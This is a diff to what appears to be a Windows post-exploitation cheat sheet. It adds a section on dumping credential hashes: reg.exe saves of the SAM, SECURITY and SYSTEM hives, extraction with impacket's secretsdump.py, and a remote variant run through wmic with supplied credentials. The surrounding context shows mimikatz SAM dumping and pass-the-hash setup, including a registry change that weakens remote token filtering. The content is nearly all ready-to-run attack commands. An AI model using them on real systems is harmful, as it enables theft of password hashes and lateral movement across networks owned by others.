@@ -125,6 +125,15 @@ mimikatz.exe
 (mimikatz) lsadump::sam  
 (mimikatz) lsadump::sam /system:..\SystemBkup.hiv /sam:..\SamBkup.hiv
 
+## Dump the hash
+reg.exe save hklm\sam c:\temp\sam.save
+reg.exe save hklm\security c:\temp\security.save
+reg.exe save hklm\system c:\temp\system.save
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+#https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py
+#Do this remotely
+wmic /node:"<computer_name>" /user:"<username>" /password:"<password>" process call create "cmd.exe /c reg save hklm\sam C:\temp\sam.save"
+
 ## Pass-the-hash
 git clone https://github.com/byt3bl33d3r/pth-toolkit  
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f  
